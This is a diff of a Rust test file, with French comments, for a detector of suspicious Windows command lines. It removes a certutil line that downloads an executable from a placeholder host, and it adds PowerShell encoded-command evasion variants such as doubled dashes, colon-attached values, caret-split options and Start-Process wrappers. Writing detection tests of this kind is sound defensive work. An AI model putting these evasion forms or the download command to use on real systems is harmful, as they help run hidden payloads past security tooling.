@@ -3607,11 +3607,40 @@ fn tirets_de_powershell() {
         if tiret == "/" {
             continue;
         }
-        let ligne = format!("certutil.exe {tiret}urlcache {tiret}f http://x.test/a a.exe");
+        // Deux tirets (pwsh prend « --enc »), la valeur collée après « : », un « ^ » de cmd au milieu.
+        for option in [
+            format!("{tiret}{tiret}enc {b64}"),
+            format!("{tiret}enc:{b64}"),
+            format!("{tiret}EncodedCommand:\"{b64}\""),
+            format!("{tiret}e^nc {b64}"),
+        ] {
+            let ligne = format!("pwsh.exe -nop {option}");
+            assert_eq!(
+                ligne_suspecte("C:\\Program Files\\PowerShell\\7\\pwsh.exe", &ligne).map(|x| x.0),
+                Some("encode"),
+                "{ligne}"
+            );
+        }
+        // Le même mot sans son tiret n'est pas une option : seul le tiret fait le verdict.
         assert_eq!(
-            ligne_suspecte("C:\\Windows\\System32\\certutil.exe", &ligne).map(|x| x.0),
-            Some("systeme"),
-            "{ligne}"
+            ligne_suspecte(
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                &format!("powershell.exe xenc {b64}")
+            )
+            .map(|x| x.0),
+            None
+        );
+        for script in [
+            format!("Start-Process powershell -ArgumentList '-nop {tiret}enc SQBFAFgA'"),
+            format!("Start-Process pwsh -ArgumentList '-nop','{tiret}{tiret}enc',$b"),
+            format!("powershell {tiret}e {b64}"),
+            format!("& powershell.exe {tiret}EncodedCommand:{b64}"),
+        ] {
+            assert_eq!(script_suspect(&script).map(|x| x.0), Some("encode"), "{script}");
+        }
+        assert_eq!(
+            script_suspect(&format!("Select-String {tiret}e motif")).map(|x| x.0),
+            None
         );
         assert_eq!(
             script_suspect(&format!(
